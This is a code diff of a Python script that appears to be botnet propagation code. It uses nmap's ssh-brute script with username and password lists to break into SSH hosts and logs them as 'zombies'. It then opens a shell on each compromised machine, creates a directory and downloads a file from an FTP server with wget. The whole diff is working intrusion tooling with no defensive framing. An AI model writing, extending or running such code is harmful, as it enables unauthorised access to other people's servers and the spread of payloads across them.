@@ -26,10 +26,26 @@ def sshLogin(user, ip, password):
         p = paramiko.SSHClient()
         p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         p.connect(ip, port=22, username=user, password=password)
-        stdin, stdout, stderr = p.exec_command("echo "+password+" | sudo -S mkdir /home/kabali")
-        opt = stdout.readlines()
-        opt = "".join(opt)
-        threadSafePrint(opt)
+        # stdin, stdout, stderr = p.exec_command("echo "+password+" | sudo -S mkdir /home/kabali")
+        # opt = stdout.readlines()
+        # opt = "".join(opt)
+        # threadSafePrint(opt)
+
+        channel = p.invoke_shell()
+        stdin = channel.makefile('wb')
+        stdout = channel.makefile('rb')
+
+        stdin.write(
+            '''
+        cd /home
+        mkdir kabali
+        cd kabali 
+        wget --user=name --password=123 ftp://10.0.0.x/path
+        ls
+        exit
+        '''
+        )
+        print(stdout.read())
     except:
         threadSafePrint("Something went wrong while login to ", ip, "with username ", user, "and password ", password)
 
@@ -38,7 +54,7 @@ def ssh(ip):
     threadSafePrint("Trying to login to ", ip)
     zombies = openFile('zombies.txt', 'a')
     scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,'
-                                                 'passdb=passwords.txt')
+                                                    'passdb=passwords.txt')
 
     if scanner_t2[ip].state() == 'up':
         protocols = scanner_t2[ip].all_protocols()
